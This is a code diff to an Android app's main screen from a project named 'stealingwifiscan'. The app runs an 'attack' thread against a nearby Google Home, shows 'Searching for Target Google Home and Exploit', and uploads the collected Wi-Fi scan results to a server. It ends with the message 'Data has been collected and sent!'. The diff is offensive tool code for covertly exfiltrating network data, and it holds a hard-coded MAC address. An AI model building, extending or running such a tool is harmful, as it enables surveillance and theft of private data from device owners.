@@ -1,11 +1,13 @@
 package com.yinhao.stealingwifiscan;
 
+import android.app.ProgressDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.support.v7.widget.SwitchCompat;
 import android.util.Base64;
 import android.widget.CompoundButton;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -17,6 +19,7 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
     private TextView mSwitchText;
     private SwitchCompat mAttackSwitch;
     private HomeDeviceInfo mGHDInfo;
+    private ProgressDialog mLoadingDlg;
     public static String OurHomeMac = "F4:F5:D8:C1:B9:2E";
     private String mGHDIP = "";
     private String mScanResults;
@@ -35,8 +38,11 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
         mSwitchText = (TextView) findViewById(R.id.switchText);
         mAttackSwitch = (SwitchCompat) findViewById(R.id.AttackSwitch);
 
-        //set default attack mode false
         mAttackSwitch.setChecked(false);
+        mLoadingDlg = new ProgressDialog(MainActivity.this);
+        mLoadingDlg.setMessage("Searching for Target Google Home and Exploit, Please Hold......");
+        mLoadingDlg.setCancelable(false);
+        mLoadingDlg.setInverseBackgroundForced(false);
 
 
         //response to attack switch
@@ -47,8 +53,9 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
                     mSwitchText.setText("Attack is on");
                     mSwitchText.setTextColor(getResources().getColor(R.color.colorAccent));
                     initilize_attackthread();
-                    mAttackThread.addListener(MainActivity.this);
                     mAttackThread.start();
+
+                    mLoadingDlg.show();
 
                 }else{
                     mSwitchText.setText("Attack is off");
@@ -79,6 +86,8 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
         };
 
         mAttackThread.label = AttackThreadLabel;
+        mAttackThread.addListener(MainActivity.this);
+
     }
 
     private void init_sendserver(){
@@ -105,6 +114,7 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
                         printout.flush ();
                         printout.close ();
                         urlConnection.disconnect();
+                        mSendServerThread.interrupt();
                         break;
 
                     } catch (IOException e) {
@@ -120,6 +130,7 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
             }
         };
         mSendServerThread.label = SendServerThreadLabel;
+        mSendServerThread.addListener(MainActivity.this);
     }
 
     @Override
@@ -143,7 +154,14 @@ public class MainActivity extends AppCompatActivity implements ThreadCompleteLis
         }
 
         if(thread.label.matches(SendServerThreadLabel)) {
-            System.out.println("Data Sent!");
+            runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    mLoadingDlg.hide();
+                    Toast.makeText(MainActivity.this, "Data has been collected and sent!", Toast.LENGTH_LONG).show();
+                }
+            });
+
         }
     }
 }
